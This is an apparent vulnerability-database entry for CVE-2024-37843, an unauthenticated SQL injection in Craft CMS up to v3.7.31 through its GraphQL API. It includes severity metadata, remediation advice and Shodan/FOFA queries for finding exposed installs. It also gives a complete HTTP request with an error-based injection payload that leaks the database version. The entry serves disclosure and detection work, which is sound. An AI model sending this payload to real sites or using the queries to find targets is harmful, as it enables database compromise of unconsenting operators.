---
layout: post
cve_id: CVE-2024-37843
title: Craft CMS <=v3.7.31 - SQL Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-37843.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-37843.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary SQL queries via the GraphQL
  API endpoint, potentially compromising the database.

  '
remediation: 'Update Craft CMS to a version later than v3.7.31.

  '
reference:
- https://blog.smithsecurity.biz/craft-cms-unauthenticated-sqli-via-graphql
- https://github.com/gsmith257-cyber/CVE-2024-37843-POC
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-37843
  cwe-id: CWE-89
  epss-score: 0.89433
  epss-percentile: 0.99526
  cpe: cpe:2.3:a:craftcms:craft_cms:*:*:*:*:*:*:*:*
metadata:
  vendor: craftcms
  product: craft_cms
  shodan-query:
  - cpe:"cpe:2.3:a:craftcms:craft_cms"
  - http.html:"craftcms"
  - http.favicon.hash:"-47932290"
  - 'X-Powered-By: Craft CMS'
  fofa-query:
  - body=craftcms
  - icon_hash=-47932290
  publicwww-query: craftcms
tags:
- cve
- cve2024
- craftcms
- sqli
- vuln
---

## ðŸ” Vulnerability Description
Craft CMS up to v3.7.31 was discovered to contain a SQL injection vulnerability via the GraphQL API endpoint.


## ðŸŒ HTTP Request
```nohighlight
POST /api/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Content-Length: 158
Content-Type: application/json
Accept-Encoding: gzip

{"query":"query  IntrospectionQuery  {assets(orderBy: \"`assets`.`volumeId`,extractvalue(1,concat(0x0a,concat('RIxT',version()))) --\", limit: 5){filename}}"}
```

